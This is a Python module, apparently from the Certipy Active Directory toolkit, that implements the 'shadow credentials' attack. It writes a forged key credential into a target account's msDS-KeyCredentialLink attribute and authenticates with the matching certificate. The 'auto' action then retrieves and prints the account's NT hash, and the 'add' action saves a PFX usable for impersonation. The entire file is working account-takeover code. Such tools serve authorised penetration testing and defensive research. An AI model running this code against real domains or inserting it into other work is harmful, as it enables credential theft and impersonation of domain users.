import argparse
from typing import List, Tuple

import ldap3
import OpenSSL
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid

from certipy.lib.certificate import create_pfx, der_to_cert, der_to_key, rsa, x509
from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.logger import logging
from certipy.lib.target import Target

from .auth import Authenticate


class Shadow:
    def __init__(
        self,
        target: Target,
        account: str,
        device_id: str = None,
        out: str = None,
        scheme: str = "ldaps",
        connection: LDAPConnection = None,
        debug=False,
        **kwargs
    ):
        self.target = target
        self.account = account
        self.device_id = device_id
        self.out = out
        self.scheme = scheme
        self.verbose = debug
        self.kwargs = kwargs

        self._connection = connection

    @property
    def connection(self) -> LDAPConnection:
        if self._connection is not None:
            return self._connection

        self._connection = LDAPConnection(self.target, self.scheme)
        self._connection.connect()

        return self._connection

    def get_key_credentials(self, target_dn: str, user: LDAPEntry) -> List[bytes]:
        results = self.connection.search(
            search_base=target_dn,
            search_filter="(objectClass=*)",
            attributes=["SAMAccountName", "objectSid", "msDS-KeyCredentialLink"],
        )

        if len(results) == 0:
            logging.error(
                "Could not get the Key Credentials for %s"
                % repr(user.get("sAMAccountName"))
            )
            return None

        result = results[0]

        return result.get_raw("msDS-KeyCredentialLink")

    def set_key_credentials(
        self, target_dn: str, user: LDAPEntry, key_credential: List[bytes]
    ):
        result = self.connection.modify(
            target_dn,
            {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, key_credential]},
        )

        if result["result"] == 0:
            return True
        elif result["result"] == 50:
            logging.error(
                "Could not update Key Credentials for %s due to insufficient access rights: %s"
                % (repr(user.get("sAMAccountName")), result["message"])
            )
            return False
        elif result["result"] == 19:
            logging.error(
                "Could not update Key Credentials for %s due to a constraint violation: %s"
                % (repr(user.get("sAMAccountName")), result["message"])
            )
        else:
            logging.error(
                "Failed to update the Key Credentials for %s: %s"
                % (repr(user.get("sAMAccountName")), result["message"])
            )
        return False

    def generate_key_credential(
        self, target_dn: str, subject: str
    ) -> Tuple[X509Certificate2, KeyCredential, str]:
        logging.info("Generating certificate")

        if len(subject) >= 64:
            logging.warning("Subject too long. Limiting subject to 64 characters.")
            subject = subject[:64]

        cert = X509Certificate2(
            subject=subject,
            keySize=2048,
            notBefore=(-40 * 365),
            notAfter=(40 * 365),
        )
        logging.info("Certificate generated")

        logging.info("Generating Key Credential")
        key_credential = KeyCredential.fromX509Certificate2(
            certificate=cert,
            deviceId=Guid(),
            owner=target_dn,
            currentTime=DateTime(),
        )

        device_id = key_credential.DeviceId.toFormatD()
        logging.info("Key Credential generated with DeviceID %s" % repr(device_id))

        return (cert, key_credential, device_id)

    def add_new_key_credential(
        self, target_dn: str, user: LDAPEntry
    ) -> Tuple[X509Certificate2, KeyCredential, List[bytes], str]:
        cert, key_credential, device_id = self.generate_key_credential(
            target_dn, "CN=%s" % user.get("sAMAccountName")
        )

        if self.verbose:
            key_credential.fromDNWithBinary(key_credential.toDNWithBinary()).show()
        logging.debug("Key Credential: %s" % key_credential.toDNWithBinary().toString())

        saved_key_credential = self.get_key_credentials(target_dn, user)

        if saved_key_credential is None:
            return None

        new_key_credential = saved_key_credential + [
            key_credential.toDNWithBinary().toString()
        ]

        logging.info(
            "Adding Key Credential with device ID %s to the Key Credentials for %s"
            % (repr(device_id), repr(user.get("sAMAccountName")))
        )

        result = self.set_key_credentials(target_dn, user, new_key_credential)

        if result is False:
            return None

        logging.info(
            "Successfully added Key Credential with device ID %s to the Key Credentials for %s"
            % (repr(device_id), repr(user.get("sAMAccountName")))
        )

        return (cert, new_key_credential, saved_key_credential, device_id)

    def get_key_and_certificate(
        self, cert: X509Certificate2
    ) -> Tuple[rsa.RSAPrivateKey, x509.Certificate]:
        key = der_to_key(
            OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert.key)
        )
        cert = der_to_cert(
            OpenSSL.crypto.dump_certificate(
                OpenSSL.crypto.FILETYPE_ASN1, cert.certificate
            )
        )

        return (key, cert)

    def auto(self):
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))

        target_dn = user.get("distinguishedName")

        result = self.add_new_key_credential(target_dn, user)
        if result is None:
            return False

        cert, _, saved_key_credential, _ = result

        key, cert = self.get_key_and_certificate(cert)

        logging.info(
            "Authenticating as %s with the certificate"
            % (repr(user.get("sAMAccountName")))
        )

        authenticate = Authenticate(self.target, cert=cert, key=key)
        authenticate.authenticate(
            username=user.get("sAMAccountName"), is_key_credential=True
        )

        logging.info(
            "Restoring the old Key Credentials for %s"
            % repr(user.get("sAMAccountName"))
        )

        result = self.set_key_credentials(target_dn, user, saved_key_credential)

        if result is True:
            logging.info(
                "Successfully restored the old Key Credentials for %s"
                % repr(user.get("sAMAccountName"))
            )

        logging.info(
            "NT hash for %s: %s"
            % (repr(user.get("sAMAccountName")), authenticate.nt_hash)
        )

        return authenticate.nt_hash

    def add(self):
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))

        target_dn = user.get("distinguishedName")

        result = self.add_new_key_credential(target_dn, user)
        if result is None:
            return False

        cert, _, _, device_id = result

        key, cert = self.get_key_and_certificate(cert)

        out = self.out
        if out is None:
            out = "%s.pfx" % user.get("sAMAccountName").rstrip("$")

        pfx = create_pfx(key, cert)

        with open(out, "wb") as f:
            f.write(pfx)

        logging.info("Saved certificate and private key to %s" % repr(out))

    def list(self):
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))

        target_dn = user.get("distinguishedName")

        key_credentials = self.get_key_credentials(target_dn, user)
        if key_credentials is None:
            return False

        if len(key_credentials) == 0:
            logging.info(
                "The Key Credentials attribute for %s is either empty or the current user does not have read permissions for the attribute"
                % repr(user.get("sAMAccountName"))
            )
            return True

        logging.info(
            "Listing Key Credentials for %s" % repr(user.get("sAMAccountName"))
        )
        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )

            logging.info(
                "DeviceID: %s | Creation Time (UTC): %s"
                % (
                    key_credential.DeviceId.toFormatD(),
                    key_credential.CreationTime,
                )
            )

    def clear(self):
        user = self.connection.get_user(self.account)
        if user is None:
            return False

        logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))

        target_dn = user.get("distinguishedName")

        logging.info(
            "Clearing the Key Credentials for %s" % repr(user.get("sAMAccountName"))
        )

        result = self.set_key_credentials(target_dn, user, [])

        if result is True:
            logging.info(
                "Successfully cleared the Key Credentials for %s"
                % repr(user.get("sAMAccountName"))
            )

        return result

    def remove(self):
        if self.device_id is None:
            logging.error(
                "A device ID (-device-id) is required for the remove operation"
            )
            return False

        user = self.connection.get_user(self.account)
        if user is None:
            return False

        logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))

        target_dn = user.get("distinguishedName")

        key_credentials = self.get_key_credentials(target_dn, user)
        if key_credentials is None:
            return False

        if len(key_credentials) == 0:
            logging.info(
                "The Key Credentials attribute for %s is either empty or the current user does not have read permissions for the attribute"
                % repr(user.get("sAMAccountName"))
            )
            return True

        device_id = self.device_id
        new_key_credentials = []
        device_id_in_current_values = False
        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )
            if key_credential.DeviceId.toFormatD() == device_id:
                logging.info(
                    "Found device ID %s in Key Credentials %s"
                    % (repr(device_id), repr(user.get("sAMAccountName")))
                )
                device_id_in_current_values = True
            else:
                new_key_credentials.append(dn_binary_value)

        if device_id_in_current_values is True:
            logging.info(
                "Deleting the Key Credential with device ID %s in Key Credentials for %s"
                % (repr(device_id), repr(user.get("sAMAccountName")))
            )

            result = self.set_key_credentials(target_dn, user, new_key_credentials)

            if result is True:
                logging.info(
                    "Successfully deleted the Key Credential with device ID %s in Key Credentials for %s"
                    % (repr(device_id), repr(user.get("sAMAccountName")))
                )
            return result
        else:
            logging.error(
                "Could not find device ID %s in Key Credentials for %s"
                % (repr(device_id), repr(user.get("sAMAccountName")))
            )
            return False

    def info(self):
        if self.device_id is None:
            logging.error("A device ID (-device-id) is required for the info operation")
            return False

        user = self.connection.get_user(self.account)
        if user is None:
            return False

        logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))

        target_dn = user.get("distinguishedName")

        key_credentials = self.get_key_credentials(target_dn, user)
        if key_credentials is None:
            return False

        if len(key_credentials) == 0:
            logging.info(
                "The Key Credentials attribute for %s is either empty or the current user does not have read permissions for the attribute"
                % repr(user.get("sAMAccountName"))
            )
            return True

        device_id = self.device_id

        for dn_binary_value in key_credentials:
            key_credential = KeyCredential.fromDNWithBinary(
                DNWithBinary.fromRawDNWithBinary(dn_binary_value)
            )
            if key_credential.DeviceId.toFormatD() == device_id:
                logging.info(
                    "Found device ID %s in Key Credentials %s"
                    % (repr(device_id), repr(user.get("sAMAccountName")))
                )
                key_credential.show()
                return True

        logging.error(
            "Could not find device ID %s in Key Credentials for %s"
            % (repr(device_id), repr(user.get("sAMAccountName")))
        )
        return False


def entry(options: argparse.Namespace) -> None:
    target = Target.from_options(options)

    account = options.account
    if account is None:
        account = target.username

    del options.account
    del options.target
    shadow = Shadow(target=target, account=account, **vars(options))

    actions = {
        "auto": shadow.auto,
        "add": shadow.add,
        "list": shadow.list,
        "clear": shadow.clear,
        "remove": shadow.remove,
        "info": shadow.info,
    }

    actions[options.shadow_action]()
